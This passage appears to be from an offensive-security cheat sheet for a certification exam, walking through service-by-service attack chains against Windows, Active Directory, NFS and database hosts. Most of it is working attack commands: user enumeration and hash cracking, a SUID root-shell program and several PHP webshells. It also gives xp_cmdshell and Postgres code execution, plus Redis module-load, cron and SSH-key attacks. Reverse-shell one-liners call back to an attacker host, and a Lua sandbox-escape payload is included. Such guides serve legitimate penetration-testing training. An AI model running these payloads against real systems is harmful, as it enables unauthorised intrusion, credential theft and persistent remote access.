### 🗺️ Decision tree
```
135 (Windows) → rpcclient null/guest session → enumdomusers/groups → user list → spray/roast [AD-QUICK]
                 (also high ports 49152+ = DCE/RPC services ; impacket-rpcdump to map them)
111 (Unix)    → rpcinfo -p → is NFS(2049) there? → showmount -e → [ENUM-NFS]
```

### Windows RPC (135)
```bash
rpcclient -U '' -N $IP            # NULL session (no creds). then inside, type:
#   srvinfo                        # OS / server info
#   enumdomusers                   # all domain users  ← the win
#   enumdomgroups ; querygroupmem 0x200
#   queryuser 0x<rid>              # details for a user (RID from enumdomusers)
#   querydispinfo                  # users + descriptions (creds hide here)
#   getdompwinfo                   # password policy (lockout → safe spraying)
rpcclient -U 'guest%' $IP          # guest fallback
impacket-rpcdump @$IP              # list all DCE/RPC endpoints (incl. the 49152+ high ports)
impacket-lookupsid $IP -no-pass    # brute RIDs → usernames (no creds)
nxc smb $IP -u '' -p '' --rid-brute   # same via nxc
```
→ usernames → `users.txt` → spray/roast (`[AD-QUICK]`).

### Unix RPC (111)
```bash
rpcinfo -p $IP                     # list RPC services (look for nfs/mountd)
showmount -e $IP                   # NFS exports → [ENUM-NFS]
```

### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| `NT_STATUS_ACCESS_DENIED` on rpcclient | null session disabled → need creds; try `guest%` |
| `enumdomusers` empty | not a DC / restricted → try `querydispinfo`, or RID-brute via lookupsid |
| 111 shows nothing | portmapper filtered → nmap `-sU -p111` too |

**Leads to:** usernames → `[AD-QUICK]` / spray; NFS → `[ENUM-NFS]`.

## [ENUM-LDAP]  Ports 389/636/3268/3269 — LDAP (the AD directory) — FULL CHAIN  → `[AD-ENUM]`, `[TECH-LDAP]`
**What it is:** the AD database over the wire. The win: **anonymous bind** can dump users/computers, and admins hide **passwords in the `description`/`info` fields**. With creds → full domain map + roast target lists → feed **BloodHound**.

### 🗺️ Decision tree
```
find base DN (namingcontexts) → anonymous bind allowed?
   YES → dump users+descriptions (creds!) + computers → build user list → spray/roast
   NO  → need creds → with ANY cred: full dump (ldapdomaindump), roast lists, BloodHound → [AD-QUICK]
LDAPS (636) if 389 says "strongerAuthRequired"
```

### Step 1 — Base DN + anonymous dump
```bash
ldapsearch -x -H ldap://$IP -s base namingcontexts          # → the base DN, e.g. dc=corp,dc=local (you NEED this)
ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local"            # anonymous: EVERYTHING (users, computers, descriptions)
ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName description memberOf | grep -iE 'sAMAccountName|description'
nxc ldap $IP -u '' -p ''                                     # quick anon check via nxc
```
- `description:` / `info:` fields with a password → spray it. **Save all sAMAccountNames → `users.txt`.**

### Step 2 — With creds → full map + roast lists
```bash
ldapsearch -x -H ldap://$IP -D 'corp.local\$U' -w '$P' -b "dc=corp,dc=local"
ldapdomaindump -u 'corp.local\$U' -p '$P' $IP -o ldd/        # browsable HTML/JSON of the whole domain
nxc ldap $IP -u $U -p $P --users --groups --asreproast asrep.txt --kerberoasting kerb.txt --trusted-for-delegation
bloodhound-python -u $U -p $P -d corp.local -ns $IP -c all --zip   # → BloodHound graph → [AD-BLOODHOUND]
windapsearch -d corp.local -u $U -p $P --dc-ip $IP -U         # users via LDAP
```

### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| `strongerAuthRequired` | LDAPS needed → use `ldaps://$IP` (636) or `-ZZ` |
| anon bind returns nothing | anonymous disabled → need any domain cred |
| `Invalid credentials (49)` | wrong user/pass/domain format → try `user@corp.local` or `corp.local\user` |
| don't know the base DN | get it from `namingcontexts` (Step 1) or `nxc smb $IP` domain field |

**Leads to:** user list + roast targets + BloodHound → the full AD chain `[AD-QUICK]`.

## [ENUM-KERBEROS]  Port 88 — Kerberos (AD) — FULL CHAIN  → `[AD-KERBEROAST]`, `[AD-ASREP]`
**🚨 Port 88 open = this is a DOMAIN CONTROLLER. Switch to AD mode.** Two "free" credential attacks live here.

### 🗺️ Decision tree
```
FIX CLOCK FIRST (sudo ntpdate $IP) — or everything errors with KRB_AP_ERR_SKEW
have a user list? → AS-REP roast (NO creds needed) → crack -m 18200
have ANY one cred? → Kerberoast (service-account hashes) → crack -m 13100
            also → enumerate, BloodHound, then the full AD chain [AD-QUICK]
no user list? → build one: RID-brute (SMB/RPC), LDAP, kerbrute userenum, SMTP
```

### Steps
```bash
sudo ntpdate $IP                                             # ⏰ FIRST — fix clock skew
# build/validate a user list (also AS-REP roasts in one go):
kerbrute userenum -d corp.local --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt
impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip $IP -format hashcat -outputfile asrep.txt   # AS-REP (no creds)
hashcat -m 18200 asrep.txt rockyou.txt                       # crack AS-REP
# with ANY one cred → Kerberoast:
impacket-GetUserSPNs -request corp.local/$U:$P -dc-ip $IP -outputfile tgs.txt
hashcat -m 13100 tgs.txt rockyou.txt                         # crack Kerberoast
```

### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| `KRB_AP_ERR_SKEW` / clock skew | `sudo ntpdate $IP` (or `rdate -n $IP`) |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | username doesn't exist → fix your user list |
| GetNPUsers returns nothing | no AS-REP-roastable users → need a cred for Kerberoast |
| name resolution fails | add the domain + DC to `/etc/hosts` (`$IP dc01.corp.local corp.local`) |

**Leads to:** crackable hashes → passwords → `[AD-QUICK]` (the full 40-point chain).

## [ENUM-WINRM]  Ports 5985/5986 — WinRM (remote PowerShell) — FULL CHAIN  → `[TECH-WINRM]`
**What it is:** remote PowerShell — **if** your account is in **Remote Management Users** or local Administrators. With working creds, this is the cleanest interactive Windows shell. (WinRM alone, with no creds, is not a way in — you need creds from elsewhere.)

### 🗺️ Decision tree
```
have creds/hash? → nxc winrm test:
   "(Pwn3d!)" → evil-winrm → interactive shell → [WINDOWS-PRIVESC-QUICK]
   valid but NOT Pwn3d → user lacks WinRM rights → use SMB instead (psexec/wmiexec) if admin
no creds → get them elsewhere (SMB/LDAP/Kerberoast/web) → come back
```

### Steps
```bash
nxc winrm $IP -u $U -p $P                 # (Pwn3d!) = you can execute here
nxc winrm $IP -u $U -H <ntlmhash>         # test with a hash (pass-the-hash)
evil-winrm -i $IP -u $U -p $P             # interactive shell (built-in upload/download)
evil-winrm -i $IP -u $U -H <ntlmhash>     # PtH shell
evil-winrm -i $IP -u $U -p $P -S          # TLS on 5986
```

### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| nxc valid but evil-winrm fails | account not in Remote Management Users → use psexec/wmiexec (if admin) |
| `Error: ... SSL` on 5986 | add `-S` (and `-P 5986`) |
| Kerberos/time errors | `ntpdate $IP`; or use `-u user -p pass` (NTLM) not Kerberos |
| hangs / no prompt | wrong creds or firewall → re-check with `nxc winrm` first |

**Leads to:** interactive Windows foothold → `[WINDOWS-PRIVESC-QUICK]`.

## [ENUM-RDP]  Port 3389 — RDP (Remote Desktop GUI) — FULL CHAIN  → `[TECH-RDP]`
**What it is:** graphical remote desktop. With creds → a full Windows desktop (great for running winPEAS visually, moving files, GUI-only apps). Very old unpatched = BlueKeep (rarely the OSCP path).

### 🗺️ Decision tree
```
have creds/hash? → nxc rdp test → xfreerdp login (GUI foothold)
   PtH? → xfreerdp /pth: (needs Restricted Admin reg setting; set it if you have another foothold)
no creds → brute ONLY with a known user (watch lockout) ; or BlueKeep if truly ancient (crash risk)
```

### Steps
```bash
nxc rdp $IP -u $U -p $P                                            # validate creds (Pwn3d! = logon works)
xfreerdp /v:$IP /u:$U /p:$P +clipboard /dynamic-resolution /cert:ignore   # connect   [MUST-RECOGNIZE]
xfreerdp /v:$IP /u:$U /pth:<ntlmhash> /cert:ignore                 # pass-the-hash (needs Restricted Admin)
xfreerdp /v:$IP /u:$U /p:$P /drive:kali,/tmp                       # map your /tmp into the session (transfer files)
# brute (last resort, known user):
hydra -l <user> -P rockyou.txt rdp://$IP -t 1                      # -t 1 : RDP locks accounts fast
nmap -p3389 --script rdp-vuln-ms12-020,rdp-ntlm-info $IP           # version/vuln + hostname/domain leak
```

### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| `/pth:` fails | target needs `DisableRestrictedAdmin=0` reg key (set it via another shell) |
| cert / negotiation error | add `/cert:ignore` (older: `/cert-ignore`) |
| black screen / disconnect | `/dynamic-resolution`, drop `+clipboard`, or try `/sec:rdp` |
| "account lockout" risk | RDP locks fast → brute with `-t 1`, prefer found creds |

**Leads to:** a GUI foothold (run winPEAS visually, transfer via mapped drive/clipboard) → `[WINDOWS-PRIVESC-QUICK]`.

## [ENUM-SNMP]  Port 161/UDP — SNMP (device monitoring) — FULL CHAIN  → `[TECH-SNMP]`
**What it is:** a monitoring protocol on **UDP 161** (so a TCP scan misses it — you need `-sU`). Guarded by a "community string" (a shared password); the default is `public`. If you can read it, it dumps **running process command-lines (passwords hide here!), users, installed software, listening ports, network info** — huge loot for near-zero effort.

### 🗺️ Decision tree
```
is 161/udp open? (nmap -sU) →  guess community string ('public' first, then brute)
   got a string? →  snmp-check / snmpwalk EVERYTHING →  mine for:
      ├─ process ARGUMENTS   → passwords typed on command lines  → reuse (SSH/web/etc.)
      ├─ usernames           → build a user list → spray / AD roast
      ├─ listening ports     → internal-only services → pivot targets
      └─ installed software  → version → searchsploit
   no string → brute harder (onesixtyone + big list); if still nothing, move on (low-value then)
```

### Step 1 — Confirm it's there (UDP!) + find the community string
```bash
nmap -sU -p161 -sV $IP                                   # is 161/udp open + version
# try the default, then brute the string:
snmpwalk -v2c -c public $IP 2>/dev/null | head           # 'public' works? (no output = wrong string/filtered)
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP   # brute the string
snmpbulkwalk -v2c -c public $IP 1.3.6 | head             # faster bulk walk
```
- Got output → you have a valid string → Step 2.
- `public` fails → brute with onesixtyone; common ones: `public`, `private`, `community`, `manager`.

### Step 2 — Dump EVERYTHING, then mine it
```bash
snmp-check $IP -c public                                 # cleanest formatted dump (START HERE)
snmpwalk -v2c -c public $IP > snmp.txt                   # full raw dump to a file
# then mine the file / targeted OIDs:
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2       # running processes
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.5       # ⭐ process ARGUMENTS — passwords live here
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.6.3.1.2       # installed software (→ searchsploit)
snmpwalk -v2c -c public $IP 1.3.6.1.4.1.77.1.2.25        # local user accounts
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.6.13.1.3         # listening TCP ports (internal services)
grep -iE 'pass|pwd|user|cred|key' snmp.txt               # quick creds sweep
```
> An **OID** = an "address" for a specific data branch. `snmp-check` already pulls the common ones; the targeted walks are for when you want just processes/args.

### Step 3 — Act on what you found
- **Password in a process arg** (e.g. a backup/db command with `-p<pass>`) → reuse it on SSH/SMB/web → `[CREDENTIALS-QUICK]`.
- **Usernames** → save to `users.txt` → spray, or AD roast (`[AD-QUICK]`).
- **Installed software + version** → `searchsploit <product> <version>`.
- **Internal listening ports** (127.0.0.1 only) → pivot targets once you have a foothold (`[PIVOT-QUICK]`).

### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| nothing from `snmpwalk` | wrong community string (brute with onesixtyone) OR 161 is filtered — confirm with `nmap -sU -p161` |
| TCP scan didn't show 161 | SNMP is **UDP** → `nmap -sU --top-ports 100` |
| `Timeout: No Response` | string wrong, or rate-limited → `-t 5 -r 2`; try `-v1` as well as `-v2c` |
| snmpwalk slow | use `snmpbulkwalk` |
| SNMPv3 (no community string) | needs a user+auth → harder; look for creds elsewhere `[LOOK-UP]` |

**Leads to:** creds in process args → spray `[CREDENTIALS-QUICK]`; user list → `[AD-QUICK]`; software version → `[EXPLOIT-RESEARCH]`.

## [ENUM-NFS]  Port 2049 (+111) — NFS (Unix file sharing) — FULL CHAIN  → `[TECH-NFS]`
**What it is:** Unix network file shares ("exports"). Two wins: (1) **read/loot** files on the share (creds/keys/source), and (2) if **`no_root_squash`** is set, a direct path to **root**.

### 🗺️ Decision tree
```
showmount -e → exports listed? →  mount one →  can you READ it? →  LOOT (creds, id_rsa, source, configs)
                                              can you WRITE it? →  check the export option:
     ├─ no_root_squash  → ⭐ SUID-root binary trick → ROOT (you're root on the mount)
     ├─ root_squash (default) → you write as 'nobody' → limited, but drop an SSH key if a home is exported
     └─ UID mismatch (can't read a file) → create a local user with the file-owner's UID, re-read
```

### Step 1 — Enumerate exports + their options
```bash
showmount -e $IP                                 # list exported folders
nmap -p111,2049 --script "nfs-ls,nfs-showmount,nfs-statfs" $IP   # exports + perms + a dir listing
rpcinfo -p $IP                                   # confirm mountd/nfs are up (needs 111)
cat /etc/exports 2>/dev/null                     # if you later get a shell — shows no_root_squash etc.
```

### Step 2 — Mount + loot (always do this)
```bash
sudo mkdir -p /mnt/nfs
sudo mount -t nfs -o vers=3,nolock $IP:/export /mnt/nfs      # try vers=3 and vers=4 if one fails
ls -la /mnt/nfs
grep -rniE 'pass|pwd|secret|key|token' /mnt/nfs 2>/dev/null  # sweep for creds
find /mnt/nfs \( -name 'id_rsa' -o -name '*.kdbx' -o -name '*.conf' -o -name '.env' \) 2>/dev/null
```

### Step 3a — `no_root_squash` → ROOT (the big one)
If the export allows root (you can create files owned by root on it), drop a **SUID-root shell** from your box (where you ARE root) and run it on the target as your low-priv foothold user:
```bash
# on KALI (as root), with the share mounted:
cat > /mnt/nfs/x.c <<'EOF'
#include <unistd.h>
int main(){ setuid(0); setgid(0); execl("/bin/bash","bash","-p",0); }
EOF
gcc /mnt/nfs/x.c -o /mnt/nfs/rootbash          # compiled binary now sits on the share, owned by root
sudo chmod +s /mnt/nfs/rootbash                 # set the SUID bit (you're root locally, so this sticks)
# on the TARGET (your low-priv shell, in that same exported dir):
./rootbash -p                                   # → id = uid=0(root) 🎉
```
> Needs: (a) a shell on the target already (NFS alone isn't remote code exec — it's a **privesc**), (b) the export mounted on your Kali as root, (c) `no_root_squash` so the SUID bit is honored.

### Step 3b — Writable export (root_squash) → SSH key
If a **user's home** is exported and writable, drop your key:
```bash
mkdir -p /mnt/nfs/.ssh ; cat ~/.ssh/id_rsa.pub >> /mnt/nfs/.ssh/authorized_keys ; ssh <user>@$IP
```

### Step 3c — UID mismatch (can't read a file you should)
```bash
ls -la /mnt/nfs            # note the numeric owner UID (e.g. 1001)
sudo useradd -u 1001 tmpuser ; sudo -u tmpuser cat /mnt/nfs/<file>   # read as that UID
```

### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| `showmount` → "clnt_create: RPC: Program not registered" | NFS/mountd down, or only NFSv4 → `mount -t nfs4`; check `rpcinfo -p` |
| `mount` → "access denied by server" | export is IP-restricted, or needs `-o vers=3` / `vers=4` |
| can see file but "Permission denied" | UID mismatch → 3c |
| `no_root_squash` SUID binary runs as *you* not root | the export is `root_squash` (default) → 3a won't work; use 3b |

**Leads to:** root (3a) via a foothold you already have; or creds/keys → `[CREDENTIALS-QUICK]`. (Full privesc detail: `[LINUX-NFS]` in Vol 4.)

## [ENUM-MSSQL]  Port 1433 — Microsoft SQL Server — FULL CHAIN  → `[SQLI-MSSQL]`, `[TECH-SQL]`
**What it is:** Microsoft's database. The prize: **`xp_cmdshell`** = run OS commands as the SQL service account (often has **SeImpersonate** → SYSTEM via Potato). Also: **steal/relay** Windows hashes, **impersonate** `sa`, and hop via **linked servers**.

### 🗺️ Decision tree
```
have creds? (or Windows auth / SQLi into MSSQL)
   YES → connect → are you sysadmin?
        ├─ sysadmin → enable + run xp_cmdshell → RCE → (SeImpersonate? → Potato → SYSTEM)
        ├─ NOT sysadmin → can you IMPERSONATE a sysadmin login? → EXEC AS → become sa → xp_cmdshell
        ├─ no impersonation → xp_dirtree/xp_fileexist → capture NetNTLM hash (Responder) → crack/relay
        └─ linked servers? → EXEC on the linked server (often sa there) → RCE/hop
   NO creds → try: sa/blank, sa/sa, found creds, SQLi auth-bypass in a web app → then as above
```

### Step 1 — Identify + test access
```bash
nmap -p1433 -sCV --script "ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password" $IP
nxc mssql $IP -u '' -p ''                         # null / blank
nxc mssql $IP -u sa -p ''                         # sa / blank (very common)
nxc mssql $IP -u $U -p $P                         # found creds ; add --local-auth for local SQL logins
nxc mssql $IP -u $U -p $P -q "SELECT @@version"   # quick query to confirm
```
- `(Pwn3d!)` or a successful query → Step 2. No creds → try sa/blank, defaults, or get creds via a web SQLi (`[SQLI-MSSQL]`).

### Step 2 — Connect
```bash
impacket-mssqlclient $U:$P@$IP -windows-auth      # Windows (domain) auth
impacket-mssqlclient $U:$P@$IP                    # SQL auth (local SQL login like 'sa')
# or straight from nxc:  nxc mssql $IP -u $U -p $P -x "whoami"   (runs xp_cmdshell in one go)
```
Check your power:
```
SELECT IS_SRVROLEMEMBER('sysadmin');      -- 1 = you're sysadmin → go straight to RCE
SELECT system_user; SELECT user_name();   -- who am I
```

### Step 3 — RCE via xp_cmdshell (sysadmin)
```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;      -- turn it on (impacket: just type: enable_xp_cmdshell)
EXEC xp_cmdshell 'whoami';                            -- RCE as the SQL service account
EXEC xp_cmdshell 'powershell -e <base64-rev-shell>';  -- full reverse shell (nc -lvnp 443) → [SHELL-WINDOWS]
```
→ shell. Then **`whoami /priv`** — SQL service accounts usually have **SeImpersonate** → `[WINDOWS-TOKENS]` → SYSTEM.

### Step 4 — Not sysadmin? Escalate inside MSSQL
```sql
-- find logins you can impersonate:
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b
  ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
EXEC AS LOGIN = 'sa';                 -- become sa → now you're sysadmin → Step 3
-- (nxc helper:)  nxc mssql $IP -u $U -p $P -M mssql_priv
```

### Step 5 — No RCE? Steal a hash (relay/crack)
```sql
EXEC xp_dirtree '\\<KALI-IP>\share';        -- forces SQL to auth to YOU
EXEC xp_fileexist '\\<KALI-IP>\share';      -- same idea
```
```bash
# Kali: catch the NetNTLMv2 hash (ANALYZE mode — poisoning is exam-banned, but a direct auth you triggered is fine):
sudo responder -I tun0 -A
# then crack:  hashcat -m 5600 hash.txt rockyou.txt   (or relay to a signing:False host, lab only)
```

### Step 6 — Linked servers (lateral)
```sql
SELECT * FROM master..sysservers;                         -- list linked servers
EXEC ('SELECT @@version; EXEC xp_cmdshell ''whoami''') AT [LINKED\SERVER];   -- run on the linked box (often sa)
```

### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| `Login failed for user` | wrong creds/auth type → try `-windows-auth` vs SQL auth; `--local-auth` on nxc |
| `xp_cmdshell` disabled / blocked | `sp_configure` to enable (needs sysadmin) → or Step 4 impersonation |
| not sysadmin, no impersonation | Step 5 (hash capture) or Step 6 (linked servers) |
| hash captured but won't crack | relay it to a `signing:False` host (lab), or move on |
| xp_cmdshell runs but no output back | run a reverse shell instead of relying on returned output |

**Leads to:** RCE as the SQL service account → often **SeImpersonate → SYSTEM** (`[WINDOWS-TOKENS]`); hash capture → crack/relay; linked servers → lateral.

## [ENUM-MYSQL]  Port 3306 — MySQL / MariaDB — FULL CHAIN  → `[SQLI-MYSQL]`
**What it is:** a database. Win paths: **dump app creds/hashes** (→ reuse), and with the **FILE privilege** → **read/write files** (webshell / read SSH keys). UDF → RCE if the plugin dir is writable.

### 🗺️ Decision tree
```
log in? (root/blank, root/root, found creds, SQLi from web) →
   dump DBs → app users/hashes → crack/reuse everywhere
   has FILE priv? → read files (/etc/passwd, configs, id_rsa) ; write webshell (if web root writable)
   plugin dir writable + superuser? → UDF RCE
no login → version exploit? default creds? SQLi via a web app?
```

### Step 1 — Log in
```bash
nmap -p3306 --script "mysql-info,mysql-empty-password,mysql-users,mysql-databases" $IP
mysql -h $IP -u root                      # blank root (very common on labs)
mysql -h $IP -u root -p                    # try: root, toor, password, '' 
mysql -h $IP -u $U -p'$P'                   # found creds
nxc mysql $IP -u $U -p $P                   # validate via nxc
```

### Step 2 — Loot the data
```sql
SHOW DATABASES; USE <db>; SHOW TABLES; SELECT * FROM users;     -- app creds/hashes → crack (hashcat) / reuse
SELECT user,authentication_string FROM mysql.user;             -- DB account hashes (-m 300 mysql-sha1 etc.)
SELECT version(); SELECT current_user(); SELECT @@secure_file_priv;   -- version + where OUTFILE may write
```

### Step 3 — FILE privilege → read/write files
```sql
SELECT LOAD_FILE('/etc/passwd');                               -- read any file (if FILE priv + secure_file_priv allows)
SELECT LOAD_FILE('/home/<user>/.ssh/id_rsa');                  -- steal a key
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/sh.php';   -- webshell (web root must be writable)
-- then: curl "http://$IP/sh.php?c=id"
```
- `@@secure_file_priv` = `''` (empty) → OUTFILE works anywhere; a path → only there; `NULL` → disabled.

### Step 4 — UDF RCE (superuser + writable plugin dir)
```sql
SELECT @@plugin_dir;                                           -- where UDF .so must go
-- use raptor_udf2 / sqlmap's lib_mysqludf_sys to get sys_exec('id')   [LOOK-UP]
```

### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| `Access denied for user 'root'@...` | wrong pass → try blank, common; or it only allows localhost → need a shell first |
| `Host ... is not allowed to connect` | remote login disabled → reach it from a foothold / via tunnel |
| `INTO OUTFILE` → "secure-file-priv" | `@@secure_file_priv` restricts writes → read-only (LOAD_FILE) or write only to its path |
| no FILE priv | just dump data (Step 2) and reuse creds |

**Leads to:** app creds → spray `[CREDENTIALS-QUICK]`; file read → keys/creds; webshell/UDF → `[WEB-UPLOAD]` / shell.

## [ENUM-POSTGRES]  Port 5432 — PostgreSQL — FULL CHAIN  → `[SQLI-POSTGRES]`
**What it is:** a database. The prize: **`COPY ... FROM PROGRAM`** = direct **RCE** as the postgres user (superuser, v9.3+). Also file read, and app-cred loot.

### 🗺️ Decision tree
```
log in? (postgres/blank, postgres/postgres, found creds) →
   are you superuser? → COPY FROM PROGRAM → RCE (reverse shell as postgres)
   not superuser → dump app DBs → creds/hashes → reuse ; read files if allowed
no login → default creds? version exploit? SQLi from a web app?
```

### Step 1 — Log in
```bash
nmap -p5432 -sCV $IP
psql -h $IP -U postgres                    # try blank, then 'postgres'
psql "postgresql://$U:$P@$IP:5432/postgres"
nxc postgres $IP -u $U -p $P                # validate
```

### Step 2 — RCE (superuser) via COPY FROM PROGRAM
```sql
-- check:  SELECT current_setting('is_superuser');
DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';                 -- runs OS command as the postgres user
SELECT * FROM cmd_exec;                          -- read the output
-- reverse shell:
COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<KALI-IP>/443 0>&1"';   -- nc -lvnp 443 first
```

### Step 3 — Loot / file read
```sql
\l                                               -- list databases
\c <db>  ; \dt  ; SELECT * FROM users;           -- dump app creds/hashes
CREATE TABLE t(x text); COPY t FROM '/etc/passwd'; SELECT * FROM t;   -- read a file
SELECT usename, passwd FROM pg_shadow;           -- DB account hashes (md5/scram)
```

### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| `password authentication failed` | try blank, `postgres`, found creds |
| `COPY ... must be superuser` | not superuser → dump data / read-only; escalate via creds |
| `FATAL: no pg_hba.conf entry` | remote login blocked → reach it from a foothold/tunnel |
| COPY FROM PROGRAM "not supported" | pre-9.3 → use other vectors (data loot, file read) |

**Leads to:** RCE as postgres → `[LINUX-PRIVESC]`; creds → spray `[CREDENTIALS-QUICK]`.

## [ENUM-REDIS]  Port 6379 — Redis (in-memory key-value store) — FULL CHAIN
**What it is:** a fast in-memory key-value DB, **very often exposed with NO authentication.** If you can talk to it you can usually read its data AND write files to disk (→ webshell / SSH key / cron), or **load a module → direct RCE** (Redis ≥ 4.0).

### 🗺️ The decision tree (follow top-to-bottom)
```
connect →  needs a password?        YES → go to [AUTH] below (find/brute the password first)
           NO (unauthenticated)  →  run INFO + CONFIG GET *, then pick an attack:
  ├─ redis_version ≥ 4.0  AND you can CONFIG SET  → A) MODULE-LOAD RCE   ← cleanest, try FIRST
  ├─ you can write files (CONFIG SET dir works)   → B) SSH key   ·   C) cron   ·   D) webshell (if web root known)
  ├─ Debian/Ubuntu packaged redis (Lua present)   → E) Lua sandbox escape (CVE-2022-0543)
  └─ CONFIG locked / nothing writable             → F) LOOT the data (creds/tokens) → reuse elsewhere
ALWAYS also do F (loot) regardless of which attack you use.
```

### Step 1 — Connect & first contact
```bash
redis-cli -h $IP                      # unauthenticated connect (no -a)
redis-cli -h $IP PING                 # PONG = reachable
nmap -p6379 -sCV $IP                  # grabs the version too
# no redis-cli?  nc $IP 6379   then type:  INFO   (Redis speaks plaintext)
```
- Prompt `$IP:6379>` with no password asked = **unauthenticated** ✅ → Step 2.
- `(error) NOAUTH Authentication required.` → needs a password → **[AUTH]** below.

### Step 2 — Enumerate (these facts pick your attack)
```
INFO server                 # redis_version  ← decides module-load (≥4.0) ; also note the OS line
INFO                        # role (master/slave), persistence, connected_clients
CONFIG GET dir              # WHERE it writes files (default /var/lib/redis or /tmp)
CONFIG GET dbfilename       # the save filename (you'll overwrite this)
CONFIG GET *                # everything — look for: requirepass, protected-mode, dir, bind
ACL WHOAMI ; ACL LIST       # Redis 6+ : who am I + what am I allowed to do
MODULE LIST                 # already-loaded modules (a left-behind exploit module = instant RCE)
KEYS *                      # every key → dump for creds/tokens (Step F)
```
**Branch on what you see:**
- `redis_version` **≥ 4.0** + `CONFIG SET` allowed → **A) module-load RCE** (best).
- `CONFIG GET dir` returns a path + `CONFIG SET` works → **B / C / D** file-write attacks.
- `CONFIG SET` → `(error) ... not allowed` / `unknown command 'CONFIG'` → config locked/renamed → **E (Lua)** or **F (loot)**.
- `KEYS *` shows app data → **F) loot** no matter what.

### A) 🚀 Module-load RCE  (Redis ≥ 4.0) — the cleanest shell
```bash
# Kali — rogue server serves a malicious exp.so and makes Redis load it:
git clone https://github.com/n0b0dyCN/redis-rogue-server ; cd redis-rogue-server
python3 redis-rogue-server.py --rhost $IP --rport 6379 --lhost <KALI-IP> --lport 4444
```
> ⚠️ This tool very commonly dies with `UnicodeDecodeError('gb18030', ...)` **right after `Loading module...`** — the module **usually loaded anyway.** Don't re-run it; drive the loaded module directly:
```bash
redis-cli -h $IP
  MODULE LIST                                              # see the 'system' module → it loaded ✅
  system.exec "id"                                         # run a command = RCE
  system.exec "bash -c 'bash -i >& /dev/tcp/<KALI-IP>/4444 0>&1'"   # reverse shell (nc -lvnp 4444 first)
# the module ignores junk bytes before output — the command still works.
```
- **Won't load / tool broken?** fixed fork: `git clone https://github.com/Dliv3/redis-rogue-server`
- **Fully manual:** `CONFIG SET dir /tmp ; CONFIG SET dbfilename exp.so ;` get `exp.so` into `/tmp`, then `MODULE LOAD /tmp/exp.so ; system.exec "id"`.
- After shell: `id` — redis custom installs sometimes run as **root** (= done). If a low-priv user → `[LINUX-PRIVESC]`.

### B) 🔑 Write an SSH key  (any version — best when there's NO web, e.g. Blackgate)
```bash
# Kali — make a key, pad it with blank lines (Redis adds metadata around the value):
ssh-keygen -t rsa -f ./redis -N ''
(echo -e "\n\n"; cat redis.pub; echo -e "\n\n") > key.txt
redis-cli -h $IP flushall                                  # optional: clean the keyspace first
cat key.txt | redis-cli -h $IP -x set sshkey               # load the padded key
redis-cli -h $IP
  CONFIG SET dir /home/<user>/.ssh      # try: /var/lib/redis/.ssh , /home/<user>/.ssh , /root/.ssh
  CONFIG SET dbfilename authorized_keys
  SAVE
# log in:
ssh -i ./redis <user>@$IP
```
> **Which user?** get names from a looted key (`KEYS *`), `/etc/passwd` if you can read it, or try the **redis** user (`/var/lib/redis/.ssh`) → then each `/home/*` → then `/root/.ssh` (only if redis runs as root).

### C) ⏰ Write a cron job  (works if redis writes as root, or into a crontab dir)
```bash
redis-cli -h $IP
  CONFIG SET dir /var/spool/cron/crontabs     # Debian/Ubuntu  (RedHat/CentOS: /var/spool/cron)
  CONFIG SET dbfilename root                   # root's crontab file
  SET x "\n\n* * * * * bash -i >& /dev/tcp/<KALI-IP>/4444 0>&1\n\n"
  SAVE
# nc -lvnp 4444 ; wait up to 60s. (Finicky — the crontab line + newlines must be exact.)
```

### D) 🌐 Write a webshell  (ONLY if a web server exists AND you know its web root)
```bash
redis-cli -h $IP
  CONFIG SET dir /var/www/html         # the real web root (must exist + be writable)
  CONFIG SET dbfilename shell.php
  SET x "<?php system($_GET['c']); ?>"
  SAVE
# curl "http://$IP/shell.php?c=id"
```

### E) 🧪 Lua sandbox escape — CVE-2022-0543  (Debian/Ubuntu packaged Redis)
A distro packaging bug breaks the Lua sandbox → RCE (try when module-load is blocked).
```bash
redis-cli -h $IP eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id","r"); local r = f:read("*a"); f:close(); return r' 0
```
`[LOOK-UP]` the exact `liblua` path on the target if that one errors.

### F) 💰 Loot the data  (ALWAYS — even with no RCE)
```bash
redis-cli -h $IP
  KEYS *                       # list every key
  TYPE <key>                   # then read by type:
  GET <key>                    #  string
  HGETALL <key>                #  hash (often user/session records)
  SMEMBERS <key> ; LRANGE <key> 0 -1
# dump the WHOLE db and grep it:
redis-cli -h $IP --scan | head
redis-cli -h $IP save ; # then read /var/lib/redis/dump.rdb if you get a shell, or:
strings dump.rdb | grep -iE 'pass|user|token|session|secret'
```
